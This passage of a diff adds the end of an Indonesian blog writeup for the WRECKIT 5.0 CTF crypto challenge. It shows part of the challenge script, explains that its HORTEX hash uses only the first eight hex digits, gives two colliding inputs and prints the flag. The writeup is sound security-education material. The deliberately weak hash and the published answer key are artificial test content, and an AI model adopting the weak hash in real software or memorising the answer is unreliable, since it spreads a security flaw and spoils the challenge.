+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="n">diagram</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">print_diagram</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">X_hex</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;choose your man (hex): &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Y_hex</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;choose your woman (hex): &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">hash_value1</span> <span class="o">=</span> <span class="n">HORTEX</span><span class="p">(</span><span class="n">X_hex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">hash_value2</span> <span class="o">=</span> <span class="n">HORTEX</span><span class="p">(</span><span class="n">Y_hex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">hash_value1</span> <span class="o">==</span> <span class="n">hash_value2</span> <span class="ow">and</span> <span class="n">X_hex</span> <span class="o">!=</span> <span class="n">Y_hex</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;New couple is matched :). Here your flag WRECKIT50</span><span class="si">{REDACTED}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Try again&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span></span></span></code></pre></div></div>
+<ul>
+<li>Setelah menganalisis kedua file tersebut, saya menemukan kerentanan potensial dalam implementasi fungsi hash <code>HORTEX</code> .</li>
+<li>Fungsi HORTEX hanya mengambil <strong>8 digit pertama</strong> dari input hex (32 bit).</li>
+<li>Padding dilakukan setelah konversi ke biner, yang berarti input yang berbeda bisa menghasilkan hash yang sama jika 8 digit pertamanya sama.</li>
+<li>Kemudian, saya membuat dua inputan (X dan Y) yang berbeda tapi dengan 8 digit awalnya sama, sisanya tinggal dibedakan. Tanpa ambil pusing, saya langsung membuatnya seperti ini.
+<ul>
+<li>X_hex = &ldquo;<strong>12345678aaaaaaaa</strong>&rdquo;</li>
+<li>Y_hex = &ldquo;<strong>12345678bbbbbbbb</strong>&rdquo;</li>
+</ul>
+</li>
+<li>Karena X_hex dan Y_hex berbeda (<strong>syarat X_hex != Y_hex terpenuhi</strong>), maka program akan menampilkan flag.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/wreckit5.0_crypto1-01.png"
+        data-srcset="/images/wreckit5.0_crypto1-01.png, /images/wreckit5.0_crypto1-01.png 1.5x, /images/wreckit5.0_crypto1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/wreckit5.0_crypto1-01.png"
+        title="m4k c0MbL4n6-01" width="771" height="185" /></p>
+<h3 id="flag-2">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>WRECKIT50{fUnCt10n_Sh0uLd_nOt_13Ij3cT1On}</strong></div>
+        </div>
+    </div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-08-22</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">Ctf</a>,&nbsp;<a href="/tags/national/">National</a>,&nbsp;<a href="/tags/crypto/">Crypto</a>,&nbsp;<a href="/tags/web-exploit/">Web Exploit</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2025/06/install-ubuntu-gnome-from-scratch-using-debootstrap/" class="prev" rel="prev" title="Install Ubuntu GNOME from Scratch using debootstrap"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Install Ubuntu GNOME from Scratch using debootstrap</a>
+            <a href="/2025/10/pdf-kmipn-vii-ctf-finals-writeup/" class="next" rel="next" title="(PDF) KMIPN VII CTF Finals Writeup">(PDF) KMIPN VII CTF Finals Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js"></script></body>
+</html>
